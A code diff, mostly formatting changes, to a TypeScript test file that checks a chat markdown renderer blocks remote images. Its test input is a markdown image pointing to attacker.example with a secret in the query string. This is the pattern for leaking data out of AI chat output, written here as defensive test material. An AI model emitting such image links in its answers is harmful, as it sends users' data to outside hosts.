@@ -25,14 +25,17 @@ Object.assign(globalThis, { React });
 const { renderToStaticMarkup } = await import("react-dom/server");
 const { ChatMarkdown } = await import("./markdown");
 
-const html = (children: string) =>
-  renderToStaticMarkup(<ChatMarkdown>{children}</ChatMarkdown>);
+const html = (children: string) => renderToStaticMarkup(<ChatMarkdown>{children}</ChatMarkdown>);
 
 test("assistant markdown suppresses remote images without a network target", () => {
   const out = html("see this ![quarterly chart](https://attacker.example/x?d=secret)");
   assert.doesNotMatch(out, /<img/i, "no image element may render for a remote src");
   assert.doesNotMatch(out, /attacker\.example/, "the hostile URL must not appear anywhere");
-  assert.match(out, /quarterly chart/, "the alt text stays visible so the reader sees the suppression");
+  assert.match(
+    out,
+    /quarterly chart/,
+    "the alt text stays visible so the reader sees the suppression",
+  );
 });
 
 test("assistant markdown suppresses protocol-relative, plain-http and javascript image sources", () => {
